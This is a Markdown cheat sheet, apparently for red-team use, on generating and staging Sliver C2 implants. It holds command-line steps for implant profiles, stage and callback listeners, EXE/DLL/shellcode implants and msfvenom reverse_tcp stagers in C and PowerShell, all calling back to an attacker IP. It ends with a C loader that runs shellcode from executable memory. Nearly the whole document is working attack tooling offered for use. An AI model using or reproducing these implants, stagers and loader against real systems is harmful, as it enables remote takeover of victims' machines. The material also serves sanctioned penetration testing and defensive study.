##  Payload Generation & Staging

### Step 1: Create a Profile
```text
# Stageless profile (full implant)
profiles new --mtls 172.16.38.137:8888 --format shellcode win64_mtls

# Beacon profile (stealthy)
profiles new --mtls 172.16.38.137:8888 --format shellcode --beacon 60 win64_beacon

# HTTP profile
profiles new --http 172.16.38.137:8080 --format shellcode win64_http
```

### Step 2: Start Stage-Listener
```text
# TCP staging
stage-listener --url tcp://172.16.38.137:8443 --profile win64_mtls

# HTTP staging
stage-listener --url http://172.16.38.137:8080 --profile win64_http

# With encryption
stage-listener --url http://172.16.38.137:8080 --profile win64_mtls --aes-encrypt-key MyKey1234 --aes-encrypt-iv 1234567890123456
```

### Step 3: Start Callback Listener
```text
# mTLS listener
mtls --lhost 172.16.38.137 --lport 8888

# HTTP listener
http --lhost 172.16.38.137 --lport 8080

# HTTPS listener
https --lhost 172.16.38.137 --lport 443

# DNS listener
dns --lhost 172.16.38.137 --domains example.com
```

### Step 4: Generate Implant
```text
# Stageless EXE
generate --mtls 172.16.38.137:8888 --format exe --save /path/to/implant.exe

# Stageless DLL
generate --mtls 172.16.38.137:8888 --format shared --save /path/to/implant.dll

# Shellcode (for custom loader)
generate --mtls 172.16.38.137:8888 --format shellcode --save /path/to/shellcode.bin
```

### Step 5: Generate Stager
```text
# Using Sliver (requires msfvenom)
generate stager --lhost 172.16.38.137 --lport 8443 --protocol tcp --format c --save /path/to/stager.c

# Using msfvenom directly (recommended)
msfvenom -p windows/x64/custom/reverse_tcp LHOST=172.16.38.137 LPORT=8443 --format c -o /path/to/stager.c

# PowerShell stager
msfvenom -p windows/x64/custom/reverse_tcp LHOST=172.16.38.137 LPORT=8443 --format psh -o /path/to/stager.ps1
```

### Step 6: Basic C Loader for Shellcode
```c
#include <windows.h>

int main() {
    unsigned char buf[] = {
        // Paste shellcode here (from xxd -i)
    };
    
    SIZE_T size = sizeof(buf);
    LPVOID addr = VirtualAlloc(NULL, size, 0x00001000, 0x40);
    RtlMoveMemory(addr, buf, size);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    WaitForSingleObject(hThread, 0xFFFFFFFF);
    return 0;
}
```

